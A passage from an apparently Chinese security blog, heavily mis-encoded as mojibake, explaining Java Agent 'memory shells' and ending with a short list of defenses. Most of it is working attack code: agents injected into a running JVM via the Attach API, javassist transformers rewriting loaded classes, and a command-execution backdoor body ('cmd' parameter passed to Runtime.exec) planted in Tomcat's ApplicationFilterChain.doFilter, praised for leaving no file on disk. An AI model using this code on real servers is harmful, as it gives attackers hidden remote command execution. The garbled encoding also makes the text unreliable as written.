JVMï¼ˆJava è™šæ‹Ÿæœºï¼‰å®ä¾‹ä¸­ã€‚ Java Agentå¯ä»¥åœ¨ç¨‹åºè¿è¡Œæ—¶åŠ¨æ€åœ°ä¿®æ”¹Javaå­—èŠ‚ç ï¼Œè¿›è€ŒåŠ¨æ€åœ°ä¿®æ”¹å·²åŠ è½½æˆ–æœªåŠ è½½çš„ç±»ã€å±æ€§å’Œæ–¹æ³•çš„æŠ€æœ¯ã€‚ å¯¹äº Agentï¼ˆä»£ç†ï¼‰æ¥è®²ï¼Œå…¶å¤§è‡´å¯ä»¥åˆ†ä¸ºä¸¤ç§ï¼Œä¸€ç§æ˜¯åœ¨ JVM å¯åŠ¨å‰åŠ è½½çš„premain-Agentï¼Œå¦ä¸€ç§æ˜¯ JVM å¯åŠ¨ä¹‹ååŠ è½½çš„agentmain-Agentã€‚è¿™é‡Œæˆ‘ä»¬å¯ä»¥å°†å…¶ç†è§£æˆä¸€ç§ç‰¹æ®Šçš„Interceptorï¼ˆæ‹¦æˆªå™¨ï¼‰ï¼Œå¦‚ä¸‹å›¾ï¼šPremain-Agent agentmain-Agent Java Agentå®ä¾‹ç¯å¢ƒé…ç½®èµ·ä¸€ä¸ªé»˜è®¤çš„Mavenç¯å¢ƒã€‚ åœ¨é¡¹ç›®çš„srcmainç›®å½•ä¸‹åˆ›å»ºresourcesç›®å½•ï¼Œå¹¶å¾€ä¸‹åˆ›å»ºMETA-INFç›®å½•ï¼Œåœ¨è¯¥ç›®å½•ä¸‹åˆ›å»ºMANIFEST.MFæ–‡ä»¶ï¼Œç›®å½•ç»“æ„å¦‚ä¸‹å›¾ï¼š åœ¨pom.xmlä¸­æ·»åŠ å¦‚ä¸‹ä»£ç ï¼š build plugins plugin groupIdorg.apache.maven.plugins/groupId artifactIdmaven-assembly-plugin/artifactId version2.6/version configuration descriptorRefs descriptorRefjar-with-dependencies/descriptorRef /descriptorRefs archive manifestFile src/main/resources/META-INF/MANIFEST.MF /manifestFile /archive /configuration executions execution phasepackage/phase goals goalsingle/goal /goals /execution /executions /plugin plugin groupIdorg.apache.maven.plugins/groupId artifactIdmaven-compiler-plugin/artifactId configuration source6/source target6/target /configuration /plugin /plugins/build premain-Agent ä¸‹é¢çš„æ–‡ä»¶éƒ½æ”¾åˆ°srcmainjavaç›®å½•ä¹Ÿå°±æ˜¯ä»£ç æ ¹ç›®å½•ä¸‹ï¼Œè¦ä¸ç„¶æœ€åè¿è¡Œçš„æ—¶å€™ä¼šæŠ¥URLClassLoaderæ‰¾ä¸åˆ°è¿™äº›ç±» ä»ä¸Šé¢æµç¨‹å›¾å¯çŸ¥ï¼Œåœ¨è¿è¡Œä¸€ä¸ªç±»çš„mainæ–¹æ³•ä¹‹å‰ï¼Œä¼šå…ˆè°ƒç”¨æŒ‡å®šjaråŒ…ä¸­Premain-Classç±»ä¸­çš„premainæ–¹æ³•ã€‚ å…ˆåˆ›å»ºä¸€ä¸ªpremain-Agentç±»ï¼š import java.lang.instrument.Instrumentation;public class Java_Agent_premain public static void premain(String args, Instrumentation inst) for (int i =0 ; i10 ; i++) System.out.println(premain-Sleep_Transformer); MANIFEST.MFæ–‡ä»¶å†…å®¹å¦‚ä¸‹ï¼š Manifest-Version: 1.0Premain-Class: org.example.Java_Agent_premain å…ˆåˆ›å»ºJava Agentçš„classæ–‡ä»¶ï¼Œå†æ‰“åŒ…æˆjarï¼š REM åˆ›å»ºclassæ–‡ä»¶javac Java_Agent_premain.javaREM ç”ŸæˆJava Agentçš„jarjar cvfm agent.jar ../../../resources/META-INF/MANIFEST.MF Java_Agent_premain.class ç„¶åæˆ‘ä»¬å°±åœ¨å½“å‰ç›®å½•ä¸‹çœ‹åˆ°äº†agent.jaråŒ…ã€‚ æˆ‘ä»¬å†åˆ›å»ºä¸€ä¸ªHelloç±»ï¼Œè¡¨ç¤ºä¸€ä¸ªæ­£å¸¸è¿è¡Œçš„ç¨‹åºï¼Œæˆ–è€…è¯´å—å®³ç¨‹åºï¼š public class Hello public static void main(String[] args) System.out.println(Hello World!); ä¿®æ”¹ä¸€ä¸‹MANIFEST.MFï¼š Manifest-Version: 1.0Main-Class: org.example.Hello æ¥ç€ç”Ÿæˆclassï¼Œåˆ›å»ºjarï¼š REM åˆ›å»ºclassæ–‡ä»¶javac Hello.javaREM ç”ŸæˆJava Agentçš„jarjar cvfm hello.jar ../../../resources/META-INF/MANIFEST.MF Hello.class åˆ°è¿™é‡Œä¸ºæ­¢å½“å‰ç›®å½•ä¸‹çš„æ–‡ä»¶å¦‚ä¸‹æ‰€ç¤ºï¼š æˆ‘ä»¬ç°åœ¨è¦åœ¨hello.jaræ‰§è¡Œä¹‹å‰æ‰§è¡Œagent.jarï¼Œæ‰§è¡Œå‘½ä»¤å¦‚ä¸‹ï¼š java -javaagent:agent.jar=Hello -jar hello.jar ç»“æœå¦‚ä¸‹å›¾ï¼š agentmain-Agentç›¸è¾ƒäºpremain-Agentåªèƒ½åœ¨JVMå¯åŠ¨å‰åŠ è½½ï¼Œagentmain-Agentèƒ½å¤Ÿåœ¨JVMå¯åŠ¨ä¹‹ååŠ è½½å¹¶å®ç°ç›¸åº”çš„ä¿®æ”¹å­—èŠ‚ç åŠŸèƒ½ã€‚ è·Ÿagentmain-Agentæœ‰å…³çš„ä¸¤ä¸ªç±»ï¼š com.sun.tools.attach.VirtualMachine com.sun.tools.attach.VirtualMachineDescriptor VirtualMachineç±»å¯ä»¥è·å–JVMä¿¡æ¯ï¼Œå†…å­˜dumpã€ç°æˆdumpã€ç±»ä¿¡æ¯ç»Ÿè®¡ï¼ˆä¾‹å¦‚JVMåŠ è½½çš„ç±»ï¼‰ç­‰ã€‚è¯¥ç±»çš„ä¸»è¦æ–¹æ³•å¦‚ä¸‹ï¼š //å…è®¸æˆ‘ä»¬ä¼ å…¥ä¸€ä¸ªJVMçš„PIDï¼Œç„¶åè¿œç¨‹è¿æ¥åˆ°è¯¥JVMä¸ŠVirtualMachine.attach() //å‘JVMæ³¨å†Œä¸€ä¸ªä»£ç†ç¨‹åºagentï¼Œåœ¨è¯¥agentçš„ä»£ç†ç¨‹åºä¸­ä¼šå¾—åˆ°ä¸€ä¸ªInstrumentationå®ä¾‹ï¼Œè¯¥å®ä¾‹å¯ä»¥åœ¨classåŠ è½½å‰æ”¹å˜classçš„å­—èŠ‚ç ï¼Œä¹Ÿå¯ä»¥åœ¨classåŠ è½½åé‡æ–°åŠ è½½ã€‚åœ¨è°ƒç”¨Instrumentationå®ä¾‹çš„æ–¹æ³•æ—¶ï¼Œè¿™äº›æ–¹æ³•ä¼šä½¿ç”¨ClassFileTransformeræ¥å£ä¸­æä¾›çš„æ–¹æ³•è¿›è¡Œå¤„ç†VirtualMachine.loadAgent() //è·å¾—å½“å‰æ‰€æœ‰çš„JVMåˆ—è¡¨VirtualMachine.list() //è§£é™¤ä¸ç‰¹å®šJVMçš„è¿æ¥VirtualMachine.detach() VirtualMachineDescriptorç±»æ˜¯ä¸€ä¸ªç”¨æ¥æè¿°ç‰¹å®šè™šæ‹Ÿæœºçš„ç±»ï¼Œå…¶æ–¹æ³•å¯ä»¥è·å–è™šæ‹Ÿæœºçš„å„ç§ä¿¡æ¯å¦‚PIDã€è™šæ‹Ÿæœºåç§°ç­‰ã€‚ æˆ‘ä»¬å¯ä»¥é€šè¿‡åˆ©ç”¨ä¸Šé¢ä¸¤ä¸ªç±»ï¼Œè·å¾—ä¸€ä¸ªæ­£å¸¸è¿è¡Œçš„JVMï¼Œå¹¶å®ç°ä¸€äº›åŠŸèƒ½ï¼Œæ¯”å¦‚è·å–JVMçš„PIDï¼š package Test2;import com.sun.tools.attach.VirtualMachine;import com.sun.tools.attach.VirtualMachineDescriptor;import java.util.List;public class GetPID public static void main(String[] args) ListVirtualMachineDescriptor vm = VirtualMachine.list(); for (VirtualMachineDescriptor vmd : vm) if (vmd.displayName().equals(Test2.GetPID)) System.out.println(vmd.id()); è¿è¡Œåç»“æœå¦‚ä¸‹ï¼š ä¸‹é¢æˆ‘ä»¬è¦å¼€å§‹è¿›è¡Œæ”»å‡»äº†ã€‚å…ˆåˆ›å»ºä¸€ä¸ªSleep_Helloç±»ï¼Œæ¨¡æ‹Ÿä¸€ä¸ªæ­£å¸¸è¿è¡Œçš„ç¨‹åºï¼š package Test2;import static java.lang.Thread.sleep;public class Sleep_Hello public static void main(String[] args) throws InterruptedException while (true) System.out.println(Hello World!); sleep(5000); ç„¶ååˆ›å»ºä¸€ä¸ªJava_Agent_agentmainç±»ï¼Œå…¶ä½œä¸ºä¸€ä¸ªJava Agentï¼Œå°†ä¼šè¢«æ‰“åŒ…æˆjarå¹¶æ³¨å…¥åˆ°JVMé‡Œï¼š package Test2;import java.lang.instrument.Instrumentation;import static java.lang.Thread.sleep;public class Java_Agent_agentmain public static void agentmain(String args, Instrumentation inst) throws InterruptedException while (true) System.out.println(è°ƒç”¨äº†Java Agent!); sleep(3000); æ¥ä¸‹æ¥æ˜¯ç¼–è¯‘æˆclasså¹¶ä¸€ä¸€æ‰“åŒ…æˆjarï¼Œæˆ‘é€‰æ‹©ä¿®æ”¹srcmainresourcesMETA-INFMANIFEST.MFæ–‡ä»¶ï¼ˆä¸å­¦ä¹ premain-Agentæ‰€ä½¿ç”¨çš„MANIFEST.MFè·¯å¾„ä¸åŒï¼‰ã€‚ Manifest-Version: 1.0Agent-Class: Test2.Java_Agent_agentmain æˆ‘ä»¬å‰é¢å·²ç»æŠŠpom.xmlè®¾ç½®å¥½äº†ï¼Œç›´æ¥è¿è¡Œå‘½ä»¤ï¼šï¼ˆåœ¨ideaçš„ç»ˆç«¯å°±å¯ä»¥äº†ï¼‰ mvn clean compile assembly:single ç„¶åä¼šåœ¨targetå‘½ä»¤ä¸‹ç”Ÿæˆå¯¹åº”çš„jarï¼š ç°åœ¨æœ‰äº†jarï¼Œä½†æ˜¯ä¸å¯èƒ½è¯´ç›´æ¥ä¸Šä¼ jarå°±å¯ä»¥æ”»å‡»ç¨‹åºï¼Œæˆ‘ä»¬éœ€è¦æ‰§è¡Œä¸€æ®µä»£ç ï¼Œè®©è¯¥Java Agentæ³¨å…¥åˆ°ç›®æ ‡JVMé‡Œï¼Œè¿™é‡Œå°±å†åˆ›å»ºä¸€ä¸ªç±»å®ç°è¿™æ®µä»£ç ï¼š package Test2;import com.sun.tools.attach.*;import java.io.IOException;import java.util.List;public class Inject_Agent public static void main(String[] args) throws IOException, AttachNotSupportedException, AgentLoadException, AgentInitializationException, AttachNotSupportedException, AgentLoadException, AgentInitializationException //è°ƒç”¨VirtualMachine.list()è·å–æ­£åœ¨è¿è¡Œçš„JVMåˆ—è¡¨ ListVirtualMachineDescriptor list = VirtualMachine.list(); for(VirtualMachineDescriptor vmd : list) //éå†æ¯ä¸€ä¸ªæ­£åœ¨è¿è¡Œçš„JVMï¼Œå¦‚æœJVMåç§°ä¸ºSleep_Helloåˆ™è¿æ¥è¯¥JVMå¹¶åŠ è½½ç‰¹å®šAgent if(vmd.displayName().equals(Test2.Sleep_Hello)) //è¿æ¥æŒ‡å®šJVM VirtualMachine virtualMachine = VirtualMachine.attach(vmd.id()); //åŠ è½½Agent virtualMachine.loadAgent(Path\\\\to\\\\horses3-1.0-SNAPSHOT-jar-with-dependencies.jar); //æ–­å¼€JVMè¿æ¥ virtualMachine.detach(); å…ˆè¿è¡ŒTest2.Sleep_Helloï¼Œç„¶åå†è¿è¡ŒInject_Agentã€‚Inject_Agentä¼šæ‰¾åˆ°Test2.Sleep_Helloå¯¹åº”çš„JVMï¼Œå¹¶æŠŠJava Agentçš„jaræ³¨å…¥å…¶ä¸­ï¼Œç„¶åJava Agenté‡Œçš„æ¶æ„ä»£ç å°±è·Ÿç€æ‰§è¡Œäº†ï¼š åŠ¨æ€ä¿®æ”¹å­—èŠ‚ç  InstrumentationåŠ¨æ€ä¿®æ”¹å­—èŠ‚ç ï¼Œç›´æ¥éƒ½å­¦è¿‡éƒ½æ˜¯ç”¨javassistæ¥è¿›è¡Œä¿®æ”¹çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å…ˆåŠ ä¸Šä¾èµ– dependency groupIdorg.javassist/groupId artifactIdjavassist/artifactId version3.27.0-GA/version /dependency Instrumentationæ˜¯JVMTIAgentï¼ˆJVM Tool Interface Agentï¼‰çš„ä¸€éƒ¨åˆ†ï¼ŒJava agenté€šè¿‡è¿™ä¸ªç±»å’Œç›®æ ‡JVMè¿›è¡Œäº¤äº’ï¼Œä»è€Œè¾¾åˆ°ä¿®æ”¹æ•°æ®çš„æ•ˆæœã€‚ è¯¥ç±»æ˜¯ä¸€ä¸ªæ¥å£ï¼Œå…¶æ–¹æ³•å¦‚ä¸‹æ‰€ç¤ºï¼š public interface Instrumentation //å¢åŠ ä¸€ä¸ªClass æ–‡ä»¶çš„è½¬æ¢å™¨ï¼Œè½¬æ¢å™¨ç”¨äºæ”¹å˜ Class äºŒè¿›åˆ¶æµçš„æ•°æ®ï¼Œå‚æ•° canRetransform è®¾ç½®æ˜¯å¦å…è®¸é‡æ–°è½¬æ¢ã€‚ void addTransformer(ClassFileTransformer transformer, boolean canRetransform); //åœ¨ç±»åŠ è½½ä¹‹å‰ï¼Œé‡æ–°å®šä¹‰ Class æ–‡ä»¶ï¼ŒClassDefinition è¡¨ç¤ºå¯¹ä¸€ä¸ªç±»æ–°çš„å®šä¹‰ï¼Œå¦‚æœåœ¨ç±»åŠ è½½ä¹‹åï¼Œéœ€è¦ä½¿ç”¨ retransformClasses æ–¹æ³•é‡æ–°å®šä¹‰ã€‚addTransformeræ–¹æ³•é…ç½®ä¹‹åï¼Œåç»­çš„ç±»åŠ è½½éƒ½ä¼šè¢«Transformeræ‹¦æˆªã€‚å¯¹äºå·²ç»åŠ è½½è¿‡çš„ç±»ï¼Œå¯ä»¥æ‰§è¡ŒretransformClassesæ¥é‡æ–°è§¦å‘è¿™ä¸ªTransformerçš„æ‹¦æˆªã€‚ç±»åŠ è½½çš„å­—èŠ‚ç è¢«ä¿®æ”¹åï¼Œé™¤éå†æ¬¡è¢«retransformï¼Œå¦åˆ™ä¸ä¼šæ¢å¤ã€‚ void addTransformer(ClassFileTransformer transformer); //åˆ é™¤ä¸€ä¸ªç±»è½¬æ¢å™¨ boolean removeTransformer(ClassFileTransformer transformer); //åœ¨ç±»åŠ è½½ä¹‹åï¼Œé‡æ–°å®šä¹‰ Classã€‚è¿™ä¸ªå¾ˆé‡è¦ï¼Œè¯¥æ–¹æ³•æ˜¯1.6 ä¹‹ååŠ å…¥çš„ï¼Œäº‹å®ä¸Šï¼Œè¯¥æ–¹æ³•æ˜¯ update äº†ä¸€ä¸ªç±»ã€‚ void retransformClasses(Class?... classes) throws UnmodifiableClassException; //åˆ¤æ–­ä¸€ä¸ªç±»æ˜¯å¦è¢«ä¿®æ”¹ boolean isModifiableClass(Class? theClass); // è·å–ç›®æ ‡å·²ç»åŠ è½½çš„ç±»ã€‚ @SuppressWarnings(rawtypes) Class[] getAllLoadedClasses(); //è·å–ä¸€ä¸ªå¯¹è±¡çš„å¤§å° long getObjectSize(Object objectToSize); è¿™é‡Œçš„ç±»è½¬æ¢å™¨æ˜¯ClassFileTransformeræ¥å£ï¼Œè¯¥æ¥å£ä¸‹åªæœ‰ä¸€ä¸ªæ–¹æ³•ï¼štransformï¼Œé‡å†™è¯¥æ–¹æ³•å³å¯è½¬æ¢ä»»æ„ç±»æ–‡ä»¶ï¼Œå¹¶è¿”å›æ–°çš„è¢«å–ä»£çš„ç±»æ–‡ä»¶ï¼Œåœ¨java agentå†…å­˜é©¬ä¸­ä¾¿æ˜¯åœ¨è¯¥æ–¹æ³•ä¸‹é‡å†™æ¶æ„ä»£ç ï¼Œä»è€Œä¿®æ”¹åŸæœ‰ç±»æ–‡ä»¶ä»£ç é€»è¾‘ï¼Œä¸addTransformeræ­é…ä½¿ç”¨ã€‚ //å¢åŠ ä¸€ä¸ªClass æ–‡ä»¶çš„è½¬æ¢å™¨ï¼Œè½¬æ¢å™¨ç”¨äºæ”¹å˜ Class äºŒè¿›åˆ¶æµçš„æ•°æ®ï¼Œå‚æ•° canRetransform è®¾ç½®æ˜¯å¦å…è®¸é‡æ–°è½¬æ¢ã€‚ void addTransformer(ClassFileTransformer transformer, boolean canRetransform); é‚£ä¹ˆå¦‚ä½•è¿ç”¨åˆ°æ”»å‡»ä¸­å‘¢ï¼Ÿå‰æ–‡è°ˆåˆ°çš„agentmain-Agenté‡Œå¯ä»¥æ‰§è¡Œä»»æ„ä»£ç ï¼Œé‚£ä¹ˆå°±è¿™ä¹ˆå†™ï¼š package Test3;import java.lang.instrument.Instrumentation;import java.lang.instrument.UnmodifiableClassException;public class Attack_jar public static void agentmain(String args, Instrumentation inst) throws InterruptedException, UnmodifiableClassException Class[] classes = inst.getAllLoadedClasses(); for (Class aClass : classes) if (aClass.getName().equals(Test3.Sleep)) inst.addTransformer(new Sleep_Transformer(), true); inst.retransformClasses(aClass); Test3.Sleepç±»ä¼¼Test2.Sleep_Helloç±»ï¼Œæ¨¡æ‹Ÿä¸€ä¸ªæ­£å¸¸çš„ç¨‹åºï¼š package Test3;import static java.lang.Thread.sleep;public class Sleep public static void main(String[] args) throws Exception while(true) hello(); sleep(3000); public static void hello() System.out.println(Hello); Sleep_Transformerç±»æ˜¯ä¸€ä¸ªå®ç°äº†ClassFileTransformeræ¥å£çš„ç±»ï¼Œå…¶åˆ©ç”¨javassistä¿®æ”¹Test3.Sleepç±»çš„helloæ–¹æ³•ï¼š package Test3;import javassist.ClassClassPath;import javassist.ClassPool;import javassist.CtClass;import javassist.CtMethod;import java.lang.instrument.ClassFileTransformer;import java.lang.instrument.IllegalClassFormatException;import java.security.ProtectionDomain;public class Sleep_Transformer implements ClassFileTransformer @Override public byte[] transform(ClassLoader loader, String className, Class? classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer) throws IllegalClassFormatException try //è·å–CtClass å¯¹è±¡çš„å®¹å™¨ ClassPool ClassPool classPool = ClassPool.getDefault(); //æ·»åŠ é¢å¤–çš„ç±»æœç´¢è·¯å¾„ if (classBeingRedefined != null) ClassClassPath ccp = new ClassClassPath(classBeingRedefined); classPool.insertClassPath(ccp); //è·å–ç›®æ ‡ç±» CtClass ctClass = classPool.get(Test3.Sleep); System.out.println(ctClass); //è·å–ç›®æ ‡æ–¹æ³• CtMethod ctMethod = ctClass.getDeclaredMethod(hello); //è®¾ç½®æ–¹æ³•ä½“ String body = System.out.println(\\Hacker!\\);; ctMethod.setBody(body); //è¿”å›ç›®æ ‡ç±»å­—èŠ‚ç  byte[] bytes = ctClass.toBytecode(); return bytes; catch (Exception e) e.printStackTrace(); return null; ç„¶ååœ¨Attack_jarç±»ä¹Ÿå°±æ˜¯Java Agentä¼šè°ƒç”¨Instrumentationç±»çš„retransformClassesæ–¹æ³•é‡æ–°åŠ è½½Test3.Sleepç±»ï¼Œæ¥ç€ç”Ÿæˆå¯¹åº”çš„jaråŒ…ï¼Œå¹¶æ³¨å…¥åˆ°Test3.Sleepå¯¹åº”çš„JVMä¸­ã€‚å†™ä¸€ä¸ªç±»å®ç°è¯¥è¿‡ç¨‹ï¼š package Test3;import com.sun.tools.attach.VirtualMachine;import com.sun.tools.attach.VirtualMachineDescriptor;import java.util.List;public class Attack_main public static void main(String[] args) throws Exception //è°ƒç”¨VirtualMachine.list()è·å–æ­£åœ¨è¿è¡Œçš„JVMåˆ—è¡¨ ListVirtualMachineDescriptor list = VirtualMachine.list(); for(VirtualMachineDescriptor vmd : list) System.out.println(vmd.displayName()); //éå†æ¯ä¸€ä¸ªæ­£åœ¨è¿è¡Œçš„JVMï¼Œå¦‚æœJVMåç§°ä¸ºTest3.Sleepåˆ™è¿æ¥è¯¥JVMå¹¶åŠ è½½ç‰¹å®šAgent if(vmd.displayName().equals(Test3.Sleep)) //è¿æ¥æŒ‡å®šJVM VirtualMachine virtualMachine = VirtualMachine.attach(vmd.id()); //åŠ è½½Agent virtualMachine.loadAgent(Path\\\\to\\\\horses3-1.0-SNAPSHOT-jar-with-dependencies.jar); //æ–­å¼€JVMè¿æ¥ virtualMachine.detach(); ç”ŸæˆjaråŒ…çš„é…ç½®æ–‡ä»¶MANIFEST.MFéœ€è¦å†æ·»åŠ ä¸¤è¡Œï¼Œå‘Šè¯‰JVMè¿™ä¸ªAgentæ”¯æŒ ç±»é‡å®šä¹‰å’Œç±»å†è½¬æ¢ï¼ˆretransformï¼‰çš„èƒ½åŠ›ã€‚ä¸ç„¶ä¼šæŠ¥é”™ ä¿®æ”¹åçš„MANIFEST.MFï¼š Manifest-Version: 1.0Agent-Class: Test3.Attack_jarCan-Redefine-Classes: true Can-Retransform-Classes: true æŒ‰ä¸Šé¢çš„é¡ºåºè¿è¡Œï¼Œç»“æœå¦‚ä¸‹ï¼š åœ¨å®æˆ˜ä¸­è®¾ç½®çš„æ–¹æ³•ä½“ä¸€èˆ¬å¦‚ä¸‹æ‰€ç¤ºï¼š String body = + javax.servlet.http.HttpServletRequest request = $1 ; + String cmd=request.getParameter(\\cmd\\); + if (cmd !=null) + Runtime.getRuntime().exec(cmd); + + ; ä¾‹å­å‡è®¾æœ‰ä¸€ä¸ªåŸºäº Spring Bootï¼ˆå†…åµŒTomcatï¼‰ çš„Webåº”ç”¨æ­£åœ¨è¿è¡Œã€‚æ”»å‡»è€…çš„ç›®æ ‡æ˜¯ï¼šå‘è¯¥åº”ç”¨çš„JVMè¿›ç¨‹æ³¨å…¥ä¸€ä¸ªå†…å­˜é©¬ï¼Œä½¿å¾—ä»»ä½•è®¿é—®è¯¥åº”ç”¨çš„HTTPè¯·æ±‚ï¼Œåªè¦æºå¸¦äº†ç‰¹å®šçš„ç§˜å¯†å‚æ•°ï¼ˆå¦‚ passwordï¼‰ï¼Œå°±èƒ½åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚ æ”»å‡»è€…ä¼šé€‰æ‹©ä¿®æ”¹ä¸€ä¸ªæ¯ä¸ªWebè¯·æ±‚éƒ½ä¼šç»è¿‡çš„æ ¸å¿ƒç±»ã€‚ä¸€ä¸ªç»å…¸çš„ç›®æ ‡æ˜¯Tomcatçš„ org.apache.catalina.core.ApplicationFilterChainç±»çš„ doFilteræ–¹æ³•ï¼Œå› ä¸ºå®ƒæ˜¯å¤„ç†æ‰€æœ‰HTTPè¯·æ±‚çš„è¿‡æ»¤å™¨é“¾çš„å…¥å£ æ³¨å…¥æ¶æ„Agent æ”»å‡»è€…é¦–å…ˆéœ€è¦å°†åŒ…å«æ¶æ„é€»è¾‘çš„Agent JaråŒ…æ³¨å…¥åˆ°ç›®æ ‡JVMä¸­ã€‚è¿™é€šå¸¸é€šè¿‡ä¸€ä¸ªç‹¬ç«‹çš„Javaç¨‹åºï¼ˆAttachç¨‹åºï¼‰å®Œæˆï¼Œè¯¥ç¨‹åºä½¿ç”¨ com.sun.tools.attach.VirtualMachineçš„Attach API // ä¼ªä»£ç ç¤ºä¾‹ï¼šAttachåˆ°ç›®æ ‡JVMè¿›ç¨‹å¹¶åŠ è½½æ¶æ„AgentVirtualMachine vm = VirtualMachine.attach(ç›®æ ‡JVMçš„è¿›ç¨‹PID);vm.loadAgent(/path/to/malicious-agent.jar);vm.detach(); Agentä¿®æ”¹å…³é”®ç±»å­—èŠ‚ç  å½“æ¶æ„Agentè¢«åŠ è½½åï¼Œå…¶ agentmainæ–¹æ³•ä¼šè¢«è°ƒç”¨ã€‚è¿™ä¸ªæ–¹æ³•ä¼šæ‰§è¡Œä»¥ä¸‹å…³é”®æ“ä½œ éå†æŸ¥æ‰¾ç›®æ ‡ç±»ï¼šä½¿ç”¨ Instrumentation.getAllLoadedClasses()æ–¹æ³•ï¼Œåœ¨æ‰€æœ‰å·²åŠ è½½çš„ç±»ä¸­å¯»æ‰¾ org.apache.catalina.core.ApplicationFilterChainã€‚ æ³¨å†Œå­—èŠ‚ç è½¬æ¢å™¨ï¼šé€šè¿‡ Instrumentation.addTransformer()æ–¹æ³•æ³¨å†Œä¸€ä¸ªè‡ªå®šä¹‰çš„ ClassFileTransformerã€‚ è§¦å‘ç±»é‡å®šä¹‰ï¼šè°ƒç”¨ Instrumentation.retransformClasses(targetClass)æ–¹æ³•ã€‚è¿™ä¼šæŒ‡ç¤ºJVMå¯¹ç›®æ ‡ç±»è¿›è¡Œé‡æ–°è½¬æ¢ï¼Œä»è€Œè§¦å‘åˆšæ‰æ³¨å†Œçš„è½¬æ¢å™¨çš„ transformæ–¹æ³•ã€‚ æ¤å…¥æ¶æ„é€»è¾‘ï¼ˆå†…å­˜é©¬ï¼‰ åœ¨ ClassFileTransformer.transformæ–¹æ³•ä¸­ï¼Œæ”»å‡»è€…ä½¿ç”¨ Javassist ç­‰å­—èŠ‚ç æ“ä½œåº“æ¥ä¿®æ”¹ ApplicationFilterChain.doFilteræ–¹æ³•çš„é€»è¾‘ã€‚ä»–ä»¬ä¼šåœ¨è¯¥æ–¹æ³•çš„å¼€å¤´æ’å…¥æ¶æ„ä»£ç ï¼Œå¤§è‡´å†…å®¹å¦‚ä¸‹ // ä¼ªä»£ç ï¼šä½¿ç”¨Javassistæ’å…¥çš„æ¶æ„ä»£ç ç‰‡æ®µjavax.servlet.http.HttpServletRequest req = $1; // æ–¹æ³•çš„ç¬¬ä¸€ä¸ªå‚æ•°javax.servlet.http.HttpServletResponse res = $2; // æ–¹æ³•çš„ç¬¬äºŒä¸ªå‚æ•°String password = req.getParameter(password);if (password != null password.equals(æ”»å‡»è€…é¢„è®¾çš„å¯†ç )) String cmd = req.getParameter(cmd); if (cmd != null) // æ‰§è¡Œå‘½ä»¤å¹¶å›ä¼ ç»“æœ java.io.InputStream in = Runtime.getRuntime().exec(cmd).getInputStream(); // ... è¯»å–å‘½ä»¤æ‰§è¡Œç»“æœï¼Œå¹¶é€šè¿‡responseè¿”å›ç»™æ”»å‡»è€… ... // åŸæ–¹æ³•é€»è¾‘ç»§ç»­æ‰§è¡Œ è¿™æ ·ï¼ŒdoFilteræ–¹æ³•å°±è¢«æ¤å…¥äº†ä¸€ä¸ªåé—¨ã€‚ æ”»å‡»æ•ˆæœä¸ç‰¹ç‚¹ä¸€æ—¦æ”»å‡»æˆåŠŸï¼Œè¿™ä¸ªå†…å­˜é©¬å°±ä¼šç”Ÿæ•ˆï¼š è§¦å‘æ–¹å¼ï¼šæ”»å‡»è€…è®¿é—® è¯¥åº”ç”¨ä¸Šçš„ä»»æ„URLï¼Œåªè¦åœ¨è¯·æ±‚å‚æ•°ä¸­å¸¦ä¸Š password=é¢„è®¾å¯†ç cmd=ç³»ç»Ÿå‘½ä»¤ï¼Œå†…å­˜é©¬å°±ä¼šåœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œç›¸åº”çš„å‘½ä»¤ã€‚ é«˜åº¦éšè”½æ€§ï¼š æ— æ–‡ä»¶è½åœ°ï¼šæ¶æ„ä»£ç å­˜åœ¨äºJVMå†…å­˜ä¸­ï¼Œç£ç›˜ä¸Šæ²¡æœ‰å¯¹åº”çš„WebShellæ–‡ä»¶ï¼Œä¼ ç»Ÿæ–‡ä»¶æ‰«ææ— æ³•æ£€æµ‹ ç»‘å®šåˆæ³•URLï¼šå†…å­˜é©¬å¯„ç”Ÿåœ¨Tomcatæ ¸å¿ƒç»„ä»¶ä¸­ï¼Œä¸ä¾èµ–ç‰¹å®šçš„å¯ç–‘URLè·¯å¾„ï¼Œæ‰€æœ‰è¯·æ±‚éƒ½ä¼šç»è¿‡å®ƒ é©»ç•™å†…å­˜ï¼šå³ä½¿åº”ç”¨é‡å¯ï¼Œå†…å­˜é©¬ä¹Ÿä¼šæ¶ˆå¤±ï¼Œä½†å¦‚æœæ”»å‡»è€…èƒ½å†æ¬¡åˆ©ç”¨æ¼æ´ï¼Œä»å¯é‡æ–°æ³¨å…¥ã€‚æœ‰äº›é«˜çº§æŠ€æœ¯å¯ä»¥å®ç°æŒä¹…åŒ–ã€‚ é˜²å¾¡ä¸æ£€æµ‹æ–¹å‘é¢å¯¹è¿™ç§å¨èƒï¼Œå¯ä»¥é‡‡å–ä»¥ä¸‹æªæ–½ï¼š RASPï¼ˆè¿è¡Œæ—¶åº”ç”¨è‡ªæˆ‘ä¿æŠ¤ï¼‰ï¼šåœ¨åº”ç”¨å†…éƒ¨ç›‘æ§å…³é”®APIçš„è°ƒç”¨ï¼ˆå¦‚ Runtime.exec()ï¼‰ï¼Œå¯¹å¯ç–‘è¡Œä¸ºè¿›è¡Œå®æ—¶æ‹¦æˆª Java Agentå®‰å…¨ç›‘æ§ï¼šéƒ¨ç½²å®‰å…¨çš„Agentï¼Œç›‘æ§JVMä¸­ç±»çš„é‡å®šä¹‰å’Œé‡è½¬æ¢è¡Œä¸ºï¼Œå¯¹æ ¸å¿ƒç±»çš„ä¿®æ”¹è¿›è¡Œå‘Šè­¦ ä¸¥æ ¼çš„è®¿é—®æ§åˆ¶ä¸ç½‘ç»œç›‘æ§ï¼šé™åˆ¶æœåŠ¡å™¨ä¸å¿…è¦çš„å‡ºç½‘æµé‡ï¼Œå¯¹æœåŠ¡å™¨ä¸Šçªç„¶å‡ºç°çš„å¯ç–‘è¿›ç¨‹è¿æ¥ä¿æŒè­¦æƒ•ã€‚","categories":["javaå†…å­˜é©¬"]},{"title":"ä»£ç å®¡è®¡-Echo2.3","path":"/2025/05/19/ä»£ç å®¡è®¡-Echo2-3/","content":"å‰è¨€æœ¬æ–‡å…ˆå‘äºå…ˆçŸ¥ç¤¾åŒºï¼šä»£ç å®¡è®¡-Echo2.3-å…ˆçŸ¥ç¤¾åŒº 